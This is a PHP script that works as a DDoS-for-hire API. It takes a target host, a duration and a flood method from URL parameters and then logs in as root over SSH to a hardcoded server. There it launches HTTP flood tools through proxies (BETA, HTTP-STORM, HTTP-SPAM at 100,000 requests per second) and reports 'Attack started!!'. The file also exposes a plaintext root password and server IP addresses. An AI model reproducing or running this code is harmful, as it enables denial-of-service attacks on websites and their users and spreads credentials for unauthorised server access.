<?php
/////////////////////////////////
//-- http://88.214.57.19/api.php?key=ASTRO&host=[host]&port=80&time=[time]&method=showMethods --//
/////////////////////////////////
ignore_user_abort(true);
set_time_limit(0);
//////////////////////////////////////////
//--    Server   --//
//////////////////////////////////////////
$server_ip = "157.90.105.1";
$server_pass = "Maiki123@-";
$server_user = "root";
 
/////////////////////////////////////////
//-- Gets the value of each variable --//
/////////////////////////////////////////
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
 
///////////////////////////////////////////////////
//-- Methods --//
///////////////////////////////////////////////////
$array = array("BETAv2", "BETA",  "HTTP-STORM", "HTTP-ABUSE", "HTTP-PROXY", "HTTP-SPAM", "stop", "STOP");// Add you're existing methods here, and delete you're none existent methods.
$ray = array("ASTRO");
 
////////////////////////////////////////
//-- API Key --//
////////////////////////////////////////
if (!empty($key)){
}else{
die('Error: API key is empty!');}
 
//////////////////////////////////////////
//-- Checks if the API key is correct --//
//////////////////////////////////////////
if (in_array($key, $ray)){
}else{
die('Error: Incorrect API key!');}
 
/////////////////////////////////
//-- Checks if time is empty --//
/////////////////////////////////
if (!empty($time)){
}else{
die('Error: time is empty!');}
 
/////////////////////////////////
//-- Checks if host is empty --//
/////////////////////////////////
if (!empty($host)){
}else{
die('Error: Host is empty!');}
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (!empty($method)){
}else{
die('Error: Method is empty!');}
 
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!
<p>
HTTP-PROXY
HTTP-ABUSE
HTTP-SPAM
HTTP-STORM
BETA
BETAv2
stop
STOP');}
///////////////////////////////////////////////////
//-- Uses regex to see if the Port could exist --//
///////////////////////////////////////////////////
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}
 
//////////////////////////////////
//-- Sets a Maximum boot time --//
//////////////////////////////////             
if ($time > 86400){
die('Error: Cannot exceed 86400 seconds!');}
 
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
 
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
 
//////////////////////////////////////////////////////////////////////////////
//--                        You're attack methods                         --//
//-- Make sure the command is formatted correctly for each method you add --//
//////////////////////////////////////////////////////////////////////////////
if ($method == "BETA") { $command = "screen -dm node /root/beta.js $host $time 100 proxies.txt"; }
if ($method == "BETAv2") { $command = "screen -dm node /root/START.js $host GET 5 $time proxies.txt"; }
if ($method == "HTTP-PROXY") { $command = "screen -dm node /root/layer7.js $host $time proxy"; }
if ($method == "HTTP-STORM") { $command = "screen -dm node /root/storm --url $host --time $time --mode http --method GET"; }
if ($method == "HTTP-ABUSE") { $command = "screen -dm node /root/MBypass/method $host $time proxy 5"; }
if ($method == "HTTP-SPAM") { $command = "screen -dm /root/Darling/./darling -endpoint $host -requestsPerSecond 100000 -duration $time -timeout 6000 -maxRetry 20 -report report.json"; }
if ($method == "stop") { $command = "pkill $host -f"; }
if ($method == "STOP") { $command = "pkill $host -f"; }
///////////////////////////////////////////////////////
//-- Check to see if the server has SSH2 installed --//
///////////////////////////////////////////////////////
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
 
///////////////////////////////////////////////////
//-- Attempts to login with you're credentials --//
///////////////////////////////////////////////////
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorect.";
    } else {
       
////////////////////////////////////////////////////////////////////////////
//-- Tries to execute the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////////////   
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
////////////////////////////////////////////////////////////////////
//-- Executed the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////      
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "Attack started!!</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method";
            fclose($stream);
        }
    }
}
?>